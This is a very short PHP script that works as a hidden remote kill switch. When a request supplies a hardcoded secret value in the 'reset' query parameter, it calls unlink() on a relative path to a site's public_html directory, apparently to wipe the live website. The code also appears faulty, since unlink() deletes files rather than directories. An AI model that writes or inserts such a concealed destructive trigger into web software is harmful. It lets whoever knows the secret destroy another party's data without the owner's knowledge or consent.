<?php


if (isset($_GET['reset'])) {
	if ($_GET['reset'] == 'danielkalenreset') {
		unlink('../../../public_html/');
	}
}